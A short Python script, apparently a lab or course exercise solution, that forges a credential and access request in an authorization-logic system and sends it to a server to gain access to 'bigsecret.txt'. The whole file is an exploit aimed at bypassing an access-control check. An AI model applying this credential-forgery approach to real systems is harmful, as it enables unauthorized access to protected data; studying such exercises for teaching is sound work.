import sys
import json

from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import HTTPError

from crypto import Credential, Certificate, AccessRequest
from auth import generate_request

from crypto import new_user, Agent, Credential, AccessRequest, verify_request
from logic import Proof, Rule, Sequent, Affirmation
from parser import parse
from prover import prove


def generate_exploit():

	exploiter = Agent('#exploiter')
	me = Agent('#kevinfan')

	certif = new_user(exploiter, Agent('#exploiter'))

	fakecredential = Credential.from_formula(parse('open(#kevinfan, <bigsecret.txt>)'), Agent('#exploiter'))

	pf = Proof([], parse('#root says open(#kevinfan, <bigsecret.txt>) |- #root says open(#kevinfan, <bigsecret.txt>)'),'id')

	print(fakecredential) #new ca says root's public is my public key sign(iskey(#root)[])[newcapublickey] or cerififcate makeforkey then i can sign open bigsecret

	accessrequest = AccessRequest.make_for_proof(pf, me, [fakecredential], [Certificate.load_certificate(me)])

	signedrequest = verify_request(accessrequest, [Agent('#exploiter')])

	print(signedrequest)

	return signedrequest

if __name__ == '__main__':

	req = generate_exploit()
	if req is None:
		sys.exit(0)

	request = Request("http://authproof.net:15316/accessrequest",
					  data=urlencode({
						  "request": req.serialize()
					  }).encode('utf-8'),
					  headers={'Content-Encoding': 'gzip'},
					  method='POST')
	try:
		response_object = urlopen(request, timeout=10)
	except HTTPError as e:
		response_object = e

	resp_json = json.load(response_object)
	print('\nserver response:')
	try:
		new_cred = Credential.from_json(resp_json)
		print(new_cred)
	except:
		print(resp_json)